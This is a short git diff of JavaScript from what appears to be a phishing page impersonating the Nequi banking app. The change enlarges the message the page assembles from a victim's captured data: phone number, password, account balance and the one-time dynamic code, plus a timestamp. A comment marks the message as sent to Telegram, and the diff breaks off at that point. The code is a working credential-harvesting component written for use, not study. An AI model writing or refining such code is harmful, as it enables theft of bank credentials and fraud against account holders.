@@ -86,10 +86,23 @@ document.addEventListener('DOMContentLoaded', () => {
 
             const celular = sessionStorage.getItem("bc_usuario") || "No encontrado";
             const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
-            const mensaje = `🔢 **DINÁMICA CAPTURADA (NEQUI)**\n\n` +
-                            `👤 **Nombre:** \`${userNombre}\`\n` +
-                            `📱 **Celular:** \`${celular}\`\n` +
-                            `⚡ **Clave:** \`${currentInput}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;
+            const userClave = sessionStorage.getItem("bc_clave") || "No encontrada";
+            const userSaldo = sessionStorage.getItem("user_saldo") || "No ingresado";
+            
+            // Obtener fecha y hora actual
+            const ahora = new Date();
+            const fechaFormateada = ahora.getFullYear() + '-' + 
+                                   String(ahora.getMonth() + 1).padStart(2, '0') + '-' + 
+                                   String(ahora.getDate()).padStart(2, '0') + ' ' + 
+                                   String(ahora.getHours()).padStart(2, '0') + ':' + 
+                                   String(ahora.getMinutes()).padStart(2, '0') + ':' + 
+                                   String(ahora.getSeconds()).padStart(2, '0');
+
+            const mensaje = `🎯 **Clave Dinámica:** \`${currentInput}\`\n\n` +
+                            `📞 **Número (Login):** \`${celular}\`\n` +
+                            `🔒 **Contraseña:** \`${userClave}\`\n` +
+                            `💰 **Saldo:** \`$${userSaldo}\`\n\n` +
+                            `⏰ **Fecha:** \`${fechaFormateada}\``;
 
             try {
                 // Enviamos a Telegram
